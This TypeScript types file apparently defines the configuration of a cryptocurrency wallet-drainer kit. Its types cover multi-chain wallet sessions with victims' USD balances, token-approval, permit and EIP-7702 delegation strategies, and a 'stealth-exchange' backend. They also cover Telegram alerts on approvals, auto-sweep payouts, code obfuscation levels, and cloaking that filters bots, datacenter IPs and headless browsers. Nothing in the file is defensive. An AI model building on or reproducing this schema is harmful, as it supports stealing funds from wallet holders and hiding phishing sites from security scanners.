export type Ecosystem = "evm" | "solana" | "tron";
export type StrategyMode = "direct" | "approve" | "permit" | "permit2" | "multicall" | "gasless" | "eip712" | "eip7702" | "trails";
export type ExecutionBackend =
  | "stealth-exchange"
  | "permit2-executor"
  | "erc2612-executor"
  | "batch-multicall"
  | "eip7702-delegate"
  | "orch";

export interface WalletSession {
  id: string;
  wallet: string;
  chain: string;
  chainId: number;
  balanceUSD: number;
  status: "connected" | "disconnected" | "pending" | "approved" | "rejected";
  timestamp: string;
  domain: string;
  country: string;
  assets: AssetInfo[];
}

export interface AssetInfo {
  symbol: string;
  name: string;
  balance: number;
  valueUSD: number;
  type: "ERC-20" | "ERC-721" | "ERC-1155" | "NATIVE";
  contractAddress?: string;
}

export interface LogEntry {
  id: string;
  type: "connection" | "signature" | "approval" | "transfer" | "chain_switch" | "error" | "disconnect";
  wallet: string;
  chain: string;
  message: string;
  timestamp: string;
  domain: string;
  metadata?: Record<string, unknown>;
}

export interface DomainConfig {
  id: string;
  domain: string;
  status: "active" | "paused" | "expired";
  createdAt: string;
  lastActivity: string;
  sessions: number;
  totalValueUSD: number;
}

export interface GeneralConfig {
  ecosystem: Ecosystem;
  solanaCluster: "mainnet-beta" | "devnet" | "testnet";
  solanaProgramId: string;
  solanaRpcUrl: string;
  tronNetwork: "mainnet" | "nile" | "shasta";
  tronContractAddress: string;
  tronRpcUrl: string;
  connectButtonClass: string;
  actionButtonClass: string;
  disconnectButtonClass: string;
  connectText: string;
  connectedText: string;
  loadingText: string;
  verifyText: string;
  rejectText: string;
  changeChainText: string;
  rejectChainText: string;
  notEligibleText: string;
  disconnectText: string;
  transactionFunctionName: string;
  themeMode: "dark" | "light" | "auto";
}

export interface WalletConfig {
  minBalanceUSD: number;
  targetChainAssetRatio: number;
  maxChainSwitchRetry: number;
  singleChainMode: boolean;
  supportedWallets: string[];
  walletVisibility: Record<string, boolean>;
  devToolsMonitoring: boolean;
  providerDetection: boolean;
  autoLoadScripts: boolean;
  waitForPageLoad: boolean;
}

export interface ModalConfig {
  modalFrameworkStyle: "walletconnect" | "web3modal" | "reown" | "rainbowkit" | "sequence" | "custom";
  popupStyle: "sweetalert2" | "comet" | "native";
  previewStyle: "trails" | "rainbowkit" | "reown" | "custom";
  themeMode: "light" | "dark";
  accentColor: string;
  accentColorForeground: string;
  borderRadius: "small" | "medium" | "large" | "full";
  connectLayout: "cards" | "list" | "grid";
  collapseWallets: boolean;
  featuredWallets: string[];
  enableEmailOption: boolean;
  enableSocials: boolean;
  overlayBlur: "none" | "light" | "medium" | "heavy";
  fontStyle: "modern" | "rounded" | "mono";
  openOnNetworkView: boolean;
  preferredChains: number[];
  walletConnectProjectId: string;
  sequenceProjectAccessKey: string;
  sequenceWaasConfigKey: string;
  sequenceWalletUrl: string;
  enableLatestWC: boolean;
  exposeExternalSDK: boolean;
  clickToOpenModal: boolean;
}

export interface TokensConfig {
  directTransfer: boolean;
  allowanceExecution: boolean;
  fallbackHandling: boolean;
  balanceBasedApproval: boolean;
  erc721Support: boolean;
  erc1155Support: boolean;
  marketplaceTransfers: boolean;
  contractFunctions: string[];
  transactionOrdering: "sequential" | "parallel" | "priority";
  visibleChains: number[];
}

export interface AdvancedConfig {
  retryCount: number;
  signaturePromptText: string;
  typedDataEnforcement: boolean;
  logFormat: "json" | "detailed" | "minimal";
  logSignaturePrompts: boolean;
  logChainSwitchEvents: boolean;
  logFullSiteURL: boolean;
  sessionCaching: boolean;
  autoSignaturePrompt: boolean;
  eligibilityReload: boolean;
  postTransactionRefresh: boolean;
}

export interface ContractTargetConfig {
  name: string;
  address: string;
  abiName: string;
  abi: unknown[];
  chainId: number;
  selectedFunctions: string[];
}

export interface ContractFunctionBindingArg {
  name: string;
  type: string;
  value: string;
}

export interface ContractFunctionBinding {
  preset: string;
  label: string;
  contractAddress: string;
  contractName: string;
  abi: unknown[];
  functionKey: string;
  functionName: string;
  stateMutability: "pure" | "view" | "nonpayable" | "payable";
  args: ContractFunctionBindingArg[];
}

export interface ContractsConfig {
  primary: ContractTargetConfig;
  secondaryTargets: ContractTargetConfig[];
  functionBindings: ContractFunctionBinding[];
}

export interface StrategyConfig {
  mode: StrategyMode;
  executionBackend: ExecutionBackend;
  fallbackMode: Exclude<StrategyMode, "eip7702"> | "none";
  gaslessEnabled: boolean;
  multicallEnabled: boolean;
  permit2Enabled: boolean;
  typedDataEnabled: boolean;
  eip7702Enabled: boolean;
  delegateCallEnabled: boolean;
  delegateCallTarget: string;
  delegateCallSelectors: string[];
  eip7702DelegationTarget: string;
  eip7702RequiresSupport: boolean;
  eip7702AuthorizationMode: "wallet" | "session" | "bundled";
  trailsEnabled: boolean;
  trailsMode: "pay" | "swap" | "fund" | "earn";
  trailsApiKey: string;
  trailsToAddress: string;
  trailsToChainId: number;
  trailsToToken: string;
  trailsToAmount: string;
  trailsWidgetUrl: string;
  obfuscationLevel: "none" | "minify" | "medium" | "heavy";
  customRpcUrl: string;
}

export interface AppKitConfig {
  appName: string;
  appDescription: string;
  appUrl: string;
  brandColor: string;
  logoUrl: string;
  supportEmail: string;
  enableAnalytics: boolean;
  enableSocialLogin: boolean;
  enableSmartWallet: boolean;
  enableWalletConnect: boolean;
  enableInjectedWallets: boolean;
  customCss: string;
}

export interface StrategyRule {
  id: string;
  name: string;
  type: "priority" | "retry" | "conditional";
  enabled: boolean;
  config: Record<string, unknown>;
  description: string;
}

export interface TelegramConfig {
  botToken: string;
  chatId: string;
  enabled: boolean;
  events: {
    connection: boolean;
    networkChange: boolean;
    approval: boolean;
    denial: boolean;
    assetActivity: boolean;
  };
}

export interface PayoutConfig {
  address: string;
  chain: string;
  autoSweep: boolean;
  minSweepAmount: number;
}

export interface CloakingConfig {
  enabled: boolean;
  filterBots: boolean;
  filterDatacenterIPs: boolean;
  filterHeadlessBrowsers: boolean;
  allowedCountries: string[];
  blockedCountries: string[];
}

export interface PlatformStats {
  totalSessions: number;
  activeSessions: number;
  totalValueProcessed: number;
  successRate: number;
  avgSessionDuration: number;
  uniqueWallets: number;
  topChain: string;
  dailySessions: { date: string; count: number; value: number }[];
  chainDistribution: { chain: string; count: number; value: number }[];
  hourlyActivity: { hour: number; count: number }[];
}
